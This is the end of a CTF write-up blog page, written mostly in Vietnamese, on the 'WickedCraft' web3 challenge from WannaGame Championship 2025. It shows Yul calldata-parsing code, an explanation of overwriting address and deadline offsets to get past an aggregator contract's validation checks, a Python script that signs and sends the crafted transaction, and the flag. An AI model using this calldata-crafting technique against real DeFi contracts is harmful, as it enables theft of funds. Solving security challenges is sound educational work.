</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">224</span><span class="p">),</span> <span class="n">hasPermit</span><span class="p">)</span> <span class="c1">// hasPermit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// calldataload(210) // permit r
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// calldataload(242) // permit s
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// calldataload(274) // permit deadline
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">switch</span> <span class="n">hasPermit</span>
</span></span><span class="line"><span class="cl">        <span class="n">case</span> <span class="mi">1</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="ow">let</span> <span class="nv">hasAffiliate</span> <span class="o">:=</span> <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">277</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">256</span><span class="p">),</span> <span class="n">hasAffiliate</span><span class="p">)</span> <span class="c1">// hasAffiliate
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">if</span> <span class="nf">eq</span><span class="p">(</span><span class="n">hasAffiliate</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">288</span><span class="p">),</span> <span class="n">shr</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">278</span><span class="p">)))</span> <span class="c1">// affiliateAddress
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">320</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">shr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                        <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">298</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">calldataload</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">299</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                    <span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span> <span class="c1">// affiliateFee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="ow">let</span> <span class="nv">hasAffiliate</span> <span class="o">:=</span> <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">210</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">256</span><span class="p">),</span> <span class="n">hasAffiliate</span><span class="p">)</span> <span class="c1">// hasAffiliate
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">if</span> <span class="nf">eq</span><span class="p">(</span><span class="n">hasAffiliate</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">288</span><span class="p">),</span> <span class="n">shr</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">211</span><span class="p">)))</span> <span class="c1">// affiliateAddress
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">320</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">shr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                        <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">231</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">calldataload</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">232</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                    <span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span> <span class="c1">// affiliateFee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Ở đây, ta sẽ ghi đè thủ công địa chỉ <code>WannaCoin</code> vào các vị trí offset 72, 92, 112 (tương ứng với các trường địa chỉ trong struct <code>SwapData</code>), ghi <code>deadline</code> thành một timestamp trong tương lai tại vị trí offset 132 trỏ tới 600 (nơi chứa giá trị thời gian). Điều này giúp vượt qua tất cả các validation checks của <code>Aggregator</code> để nó đồng ý thực thi lệnh <code>execute</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sel_swap</span> <span class="o">=</span> <span class="n">get_selector</span><span class="p">(</span><span class="s2">&#34;swap(bytes)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">params_swap</span> <span class="o">=</span> <span class="n">encode</span><span class="p">([</span><span class="s1">&#39;bytes&#39;</span><span class="p">],</span> <span class="p">[</span><span class="nb">bytes</span><span class="p">(</span><span class="n">blob</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_data</span> <span class="o">=</span> <span class="n">sel_swap</span> <span class="o">+</span> <span class="n">params_swap</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tx_params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">aggregator_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">tx_data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="mi">3000000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">tx_params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_params</span><span class="p">[</span><span class="s1">&#39;nonce&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_tx</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">tx_params</span><span class="p">,</span> <span class="n">PRIVATE_KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_tx</span><span class="o">.</span><span class="n">raw_transaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Tx Hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solved</span> <span class="o">=</span> <span class="n">setup_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">isSolved</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">solved</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">CHALLENGE SOLVED!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p><strong>Flag:</strong> <code>W1{tHlS_l5-wlCKeDCRAft-Ch@IIenGE_F1ag82de}</code></p>
</div>
    <footer class="article-footer"><blockquote class="article-copyright"><p><strong><span class="icon-user icon"></span>Author: </strong>r1muru</p><p>
      <strong><span class="icon-link icon"></span>Permalink: </strong><a href="http://localhost:1313/post/wannagamechampionship2025/">http://localhost:1313/post/wannagamechampionship2025/</a>
    </p><p>
      
      <strong><span class="icon-copyright icon"></span>License: </strong>
      All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!
    </p>
    <span class="icon-creative-commons article-copyright-bg"></span></blockquote>
<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/ctf"
        rel="tag"
        >CTF</a
      >
    </li><li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/cryptography"
        rel="tag"
        >CRYPTOGRAPHY</a
      >
    </li><li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/reverse"
        rel="tag"
        >REVERSE</a
      >
    </li><li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/web3"
        rel="tag"
        >WEB3</a
      >
    </li></ul>
</footer>
  </div><nav
    id="article-nav"
    aria-label="Article navigation"
    data-aos="fade-up"
  ><div class="article-nav-link-wrap left"><img
            data-src="/images/fips205/avatar.png"
            data-sizes="auto"
            alt="Implementing FIPS 205 - Stateless Hash-Based Digital Signature Standard (Part 1)"
            class="lazyload"
          /><a
          href="/post/implementing_fips_205_p1/"
          aria-label="Prev:Implementing FIPS 205 - Stateless Hash-Based Digital Signature Standard (Part 1)"
          title="Prev:Implementing FIPS 205 - Stateless Hash-Based Digital Signature Standard (Part 1)"
        ></a>
        <div class="article-nav-caption">Prev</div>
        <h3 class="article-nav-title">Implementing FIPS 205 - Stateless Hash-Based Digital Signature Standard (Part 1)</h3>
      </div></nav></article></section>
        </div><footer id="footer" aria-label="Site footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info"><div>
      <span class="icon-copyright"></span>2024-2025<span class="footer-info-sep rotate"></span>
      r1muru
    </div><div>
        Powered by&nbsp;<a
          href="https://gohugo.io/"
          target="_blank"
          rel="noopener nofollow noreferrer"
          >Hugo</a
        >&nbsp; Theme.<a
          href="https://github.com/D-Sketon/hugo-theme-reimu"
          target="_blank"
          rel="noopener nofollow noreferrer"
          >Reimu</a
        >
      </div><div>
        <span class="icon-brush"
          >&nbsp;33.7k</span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;02:46</span>
      </div><div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv"
          >Number of visits&nbsp;<span
            id="busuanzi_value_site_pv"
          ></span
        ></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv"
          >Number of visitors&nbsp;<span
            id="busuanzi_value_site_uv"
          ></span
        ></span>
      </div></div>
</footer>
<div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div><div id="mask" class="hide"></div>
      </div><nav id="mobile-nav" aria-label="Mobile navigation">
  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
<div class="sidebar-toc-wrapper toc-div-class">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#king-halo">King Halo</a></li>
  </ul>

  <ul>
    <li><a href="#buzzing">Buzzing</a></li>
  </ul>

  <ul>
    <li><a href="#freex">Freex</a></li>
    <li><a href="#wickedcraft">WickedCraft</a></li>
  </ul>
</nav>
</div></div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img
    data-src="/avatar/avatar.png"
    data-sizes="auto"
    alt="r1muru"
    class="lazyload"
  />
  <div class="sidebar-author-name">r1muru</div>
  <div class="sidebar-description">Life is not fair, get used to it</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">13</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      4
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">11</div>
  </a>
</div>
<div class="sidebar-social"><div class="icon-discord sidebar-social-icon">
      <a
        href="https://discordapp.com/users/r1muru2006"
        itemprop="url"
        target="_blank"
        aria-label="discord"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-email sidebar-social-icon">
      <a
        href="cuongchu200@gmail.com"
        itemprop="url"
        target="_blank"
        aria-label="email"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-facebook sidebar-social-icon">
      <a
        href="https://www.facebook.com/chu.cuong.732399"
        itemprop="url"
        target="_blank"
        aria-label="facebook"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/r1muru2006"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-instagram sidebar-social-icon">
      <a
        href="https://www.instagram.com/r1murun0pr0"
        itemprop="url"
        target="_blank"
        aria-label="instagram"
        rel="noopener nofollow noreferrer"
      ></a>
    </div></div>
<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>&#xf015;</div>
      <div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>&#xf187;</div>
      <div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon '>&#xf007;</div>
      <div class="sidebar-menu-link">About</div>
    </div></div>
</div></div><div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div></nav>
</div><div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png" />
        </div>
      </div><script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script><script src="/js/pjax_main.js" data-pjax></script><script>
    var ALGOLIA_CONFIG = {
      logo: '\/images\/algolia_logo.svg',
      algolia: {
        applicationID: "RAY96S32HW",
        apiKey: "53e71efc7b6ca695cdb630e780aeae50",
        indexName: "my-blog",
        hits: {
          "per_page": parseInt("10")
        },
        labels: {
          "input_placeholder": 'Search.....',
          "hits_empty": 'No results found for 「${query}」',
          "hits_stats": 'Found ${hits} results (in ${time} ms)'
        }
      }
    };
  </script><script
    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
    if (window.firework) {
      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
      options.excludeElements = options.excludeelements;
      delete options.excludeelements;
      window.firework(options);
    }
  }
</script><script
    src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js"
    integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE/jMSCxD&#43;jAPU55x/jj3wlf" crossorigin="anonymous"></script><script src="/js/pjax.js" ></script>

<div id="lazy-script">
  <div><script data-pjax>
        window.REIMU_POST = {
          author: "r1muru",
          title: "WannaGame Championship 2025",
          url: "http:\/\/localhost:1313\/post\/wannagamechampionship2025\/",
          description: "Lần đầu với team laviaespa và đứng vị trí thứ 4 chung cuộc",
          cover: "http:\/\/localhost:1313\/images\/WannaChamp\/avatar.png",
        };
      </script><script src="/js/insert_highlight.js" data-pjax></script><script src="/js/tabs.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
          if (_$$(`${gallery} ${children}`).length > 0) {
            new PhotoSwipeLightbox({
              gallery,
              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
          }
        }
        const pswp = () => {
          initPswp('.article-entry', 'a.article-gallery-item');
          initPswp('.article-gallery', 'a.article-gallery-item');
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script><script
    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
          var renderMath = () => {
            if (!window.renderMathInElement) return;
            window.renderMathInElement(_$("article"), {
              delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "\\[", right: "\\]", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
              ],
            });
          };
          if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
          } else {
            renderMath();
          }
        </script></div>
</div><script
    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then((registrations) => {
        for (let registration of registrations) {
          registration.unregister();
        }
      });
    }
  </script><script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script><script
    src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js"
    integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr&#43;h5UfruuRL/aORyw&#43;5&#43;HZoU6e" crossorigin="anonymous"></script><script>
    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
      if (window.matchMedia('(max-width: 959px)').matches) {
        const meting = _$('meting-js');
        if (meting) {
          meting.setAttribute('fixed', 'true');
          const aside = meting.parentNode?.parentNode;
          if (aside?.tagName === 'ASIDE') {
            meting.parentNode.removeChild(meting);
            document.body.appendChild(meting);
          }
        }
      }
      const script = document.createElement('script');
      script.src = "https:\/\/npm.webcache.cn\/meting@2.0.1\/dist\/Meting.min.js";
      script.integrity = "sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8\u002b0maanw1S\/IyB\u002bY4JG\u002bZDU7GpKE8";
      script.crossOrigin = "anonymous";
      document.body.appendChild(script);
    }
  </script></body>
</html>
